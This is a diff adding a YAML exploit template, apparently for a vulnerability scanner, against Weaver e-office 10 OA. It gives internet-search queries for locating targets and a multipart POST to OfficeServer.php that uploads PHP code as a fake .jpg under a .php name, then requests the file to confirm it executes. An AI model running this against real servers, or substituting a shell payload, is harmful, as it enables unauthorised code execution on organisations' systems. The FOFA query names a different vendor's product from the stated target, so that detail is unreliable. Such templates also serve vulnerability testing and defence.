@@ -1,0 +1,56 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE10"
+    hunter-query: app.name=="泛微 e-office 10 OA"
+    quake-query: app:"泛微 Eoffice10"
+    zoomeye-query: app:"泛微 E-office 10"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-fanwei-e-office10-officeserver.php-upload
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomInt(10000,99999)
+  s2: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+      body: |
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+        Content-Type: image/jpeg
+        
+        <?php echo "test" ?>
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FormData"
+        
+        {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{s2}}.php'}
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--     
+    expression: >-
+      response.status == 200 
+
+  r1:
+    request:
+      method: GET
+      path: /eoffice10/server/public/iWebOffice2015/Document/{{s2}}.php
+    expression: >-
+      response.status == 200 && response.body_string.contains("test")
+
+    output:
+      search: |-
+        "(?P<token>\\w+)".bsubmatch(response.body)
+      token: search["token"]
+
+expression: r0() && r1()
